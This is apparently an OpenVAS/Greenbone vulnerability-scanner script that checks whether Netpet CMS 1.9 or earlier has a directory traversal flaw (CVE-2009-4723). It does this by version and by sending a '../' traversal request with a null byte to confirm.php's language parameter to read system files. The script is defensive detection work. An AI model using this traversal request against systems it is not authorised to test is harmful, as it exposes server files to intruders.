CPE = "cpe:/a:netpet:netpet_cms";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902024" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_cve_id( "CVE-2009-4723" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-03-23 15:59:14 +0100 (Tue, 23 Mar 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Netpet CMS <= 1.9 Directory Traversal Vulnerability" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_netpet_cms_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "netpetcms/detected" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/9333" );
	script_xref( name: "URL", value: "http://www.vupen.com/english/advisories/2009/2125" );
	script_tag( name: "impact", value: "Successful exploitation could allow the attackers to include or
   disclose the contents of local files with the privileges of the web server." );
	script_tag( name: "affected", value: "Netpet CMS version 1.9 and prior." );
	script_tag( name: "insight", value: "The flaw is due to input validation error in the 'confirm.php'
  script when processing the 'language' parameter." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one." );
	script_tag( name: "summary", value: "Netpet CMS is prone to a directory traversal vulnerability." );
	script_tag( name: "qod_type", value: "remote_banner" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("version_func.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!infos = get_app_version_and_location( cpe: CPE, port: port, exit_no_version: FALSE )){
	exit( 0 );
}
vers = infos["version"];
dir = infos["location"];
if( vers && vers != "unknown" ){
	if(version_is_less_equal( version: vers, test_version: "1.9" )){
		report = report_fixed_ver( installed_version: vers, fixed_version: "None", install_path: dir );
		security_message( port: port, data: report );
		exit( 0 );
	}
	exit( 99 );
}
else {
	if(!dir){
		exit( 0 );
	}
	if(dir == "/"){
		dir = "";
	}
	files = traversal_files();
	for pattern in keys( files ) {
		file = files[pattern];
		url = dir + "/confirm.php?language=../../../../../../../" + file + "%00";
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

